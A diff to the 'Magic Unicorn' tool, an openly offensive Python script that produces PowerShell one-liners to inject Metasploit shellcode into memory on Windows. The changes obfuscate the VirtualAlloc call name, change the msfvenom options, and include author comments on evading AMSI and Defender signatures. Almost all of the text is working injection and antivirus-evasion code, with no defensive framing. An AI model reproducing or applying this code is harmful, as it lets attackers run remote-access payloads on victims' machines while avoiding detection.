@@ -491,7 +491,7 @@ python unicorn.py ms
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.6.1 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.6.2 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -777,7 +777,7 @@ def generate_shellcode(payload, ipaddr, port):
         # gen random number for length
         uri_length=generate_random_number(3,6)
 
-        proc = subprocess.Popen("msfvenom -p {0} {1} {2} -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c".format(payload, ipaddr, port, uri_length), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        proc = subprocess.Popen("msfvenom -p {0} {1} {2} --platform windows --smallest -f c".format(payload, ipaddr, port, uri_length), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         data = proc.communicate()[0]
         # If you are reading through the code, you might be scratching your head as to why I replace the first 0xfc (CLD) from the beginning of the Metasploit meterpreter payload. Defender writes signatures here and there for unicorn, and this time they decided to look for 0xfc in the decoded (base64) code through AMSI. Interesting enough in all my testing, we shouldn't need a clear direction flag and the shellcode works fine. If you notice any issues, you can simply just make a variable like $a='0xfc'; at the beginning of the command and add a $a at the beginning of the shellcode which also evades. Easier to just remove if we don't need which makes the payload 4 bytes smaller anyways.
         #data = data.decode("ascii").replace('"\\xfc', '"', 1)
@@ -872,6 +872,10 @@ def gen_shellcode_attack(payload, ipaddr, port):
         if var13.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var13
+        var14 = generate_random_string(3, 3) # $allocreplace
+        if var14.lower() in varcheck.lower():
+            reroll = True
+        varcheck = varcheck + var14
 
         if reroll == True: print("[*] Great Scott!! There was a variable conflict. This happens. It's OK Marty. Rerolling variable names until we get a solid set to remove conflicting names.")
         if reroll == False: break
@@ -885,15 +889,17 @@ def gen_shellcode_attack(payload, ipaddr, port):
     # randomize kernel32.dll and msvcrt.dll
     kernel = mangle_word("kernel32.dll")
     msv = mangle_word("msvcrt.dll")
+    virtual_alloc = mangle_word("VirtualAlloc")
 
     # here we do a little magic to get around AMSI, no more cat and mouse game here by chunking of shellcode, it's not needed since Defender and AMSI is still signature driven primarily
     random_symbols = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '+', '=', '{', '}', '|', '.', ':', ';', '<', '>', '?', '/']
     mangle_shellcode = (random.choice(random_symbols))
+
     #mangle_shellcode = generate_random_string(1, 1).upper()
     shellcode = shellcode.replace("0x", mangle_shellcode)
 
     # one line shellcode injection with native x86 shellcode
-    powershell_code = (r'''$1111='$tttt=''[DllImport(("%s"))]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$wwww=Add-Type -member $tttt -Name "%s" -namespace Win32Functions -pass;$zzzz="%s";[byte[]]$zzzz = $zzzz.replace("SHELLCODE_STUB","0x").Split(",");$gggg=0x$randstack;if ($zzzz.L -gt 0x$randstack){$gggg=$zzzz.L};$xxxx=$wwww::VirtualAlloc(0,0x$randstack,$gggg,0x40);for($iiii=0;$iiii -le($zzzz.Length-1);$iiii++){$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::CreateThread(0,0x00,$xxxx,0,0,0);';$hhhh=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";if([IntPtr]::Size -eq 8){$2222="C:\$4444\syswow64\$4444$2222\v1.0\$2222"};iex " $2222 -e $hhhh -noe"''' % (kernel,kernel,msv,randomize_service_name,shellcode)).replace("SHELLCODE_STUB", mangle_shellcode)
+    powershell_code = (r'''$1111='$tttt=''[DllImport(("%s"))]public static extern IntPtr $allocreplace(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$tttt=$tttt.replace("$allocreplace", "%s");$wwww=Add-Type -member $tttt -Name "%s" -namespace Win32Functions -pass;$zzzz="%s";[byte[]]$zzzz = $zzzz.replace("SHELLCODE_STUB","0x").Split(",");$gggg=0x$randstack;if ($zzzz.L -gt 0x$randstack){$gggg=$zzzz.L};$xxxx=$wwww::VirtualAlloc(0,0x$randstack,$gggg,0x40);for($iiii=0;$iiii -le($zzzz.Length-1);$iiii++){$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::CreateThread(0,0x00,$xxxx,0,0,0);';$hhhh=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";if([IntPtr]::Size -eq 8){$2222="C:\$4444\syswow64\$4444$2222\v1.0\$2222"};iex " $2222 -e $hhhh -noe"''' % (kernel,kernel,msv,virtual_alloc,randomize_service_name,shellcode)).replace("SHELLCODE_STUB", mangle_shellcode)
 
     # if we want to use AMSI bypassing, currently snagged by defender based on signature updates - easy to get around if you mangle
     if AMSI_BYPASS.lower() == "on": powershell_code = bypass_amsi() + ";" + powershell_code
@@ -902,7 +908,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
     powershell_code = powershell_code.replace("$1111", var1).replace("$cccc", var2).replace(
         "$2222", var3).replace("$3333", var4).replace("$xxxx", var5).replace("$tttt", var6).replace(
         "$hhhh", var7).replace("$zzzz", var8).replace("$gggg", var9).replace("$iiii", var10).replace(
-        "$wwww", var11).replace("$randstack", var12).replace("$4444", var13)
+        "$wwww", var11).replace("$randstack", var12).replace("$4444", var13).replace("$allocreplace", var14)
 
     # if we have PRINT_DECODED="ON" this will spit out the raw powershell code for you
     if PRINT_DECODED.lower() == "on":
